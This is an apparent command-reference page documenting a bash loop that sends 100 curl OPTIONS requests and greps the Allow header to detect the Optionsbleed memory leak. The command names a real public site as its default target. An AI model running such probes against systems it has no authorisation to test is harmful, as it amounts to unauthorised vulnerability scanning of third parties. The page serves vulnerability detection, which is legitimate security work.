---
data: >-
  for i in {1..100}; do curl -sI -X OPTIONS https://www.google.com/|grep -i
  "allow:"; done
tags:
  - http
  - optionsbleed
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.023Z'
id: 483b1908-a6a2-4c37-8b6e-a392a66ea339
verified: false
validated: true
submitted: true
---
# Curl Options Loop

## Command

```bash
for i in {1..100}; do curl -sI -X OPTIONS https://www.google.com/|grep -i "allow:"; done
```

## Description

Loops OPTIONS requests to detect varying Allow headers from memory leaks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| {1..100} | Loop count | Yes |
| -sI | Silent head | Yes |
| -X OPTIONS | Method | Yes |
| https://www.google.com/ | Target | Yes |
| grep -i "allow:" | Filter | Yes |

## Examples

### Basic Usage

```bash
for i in {1..100}; do curl -sI -X OPTIONS https://target/|grep -i "allow:"; done
```

## Expected Output

Allow headers; corrupted on vulns.

## Related

- [[commands/configure-curl-cfi]]
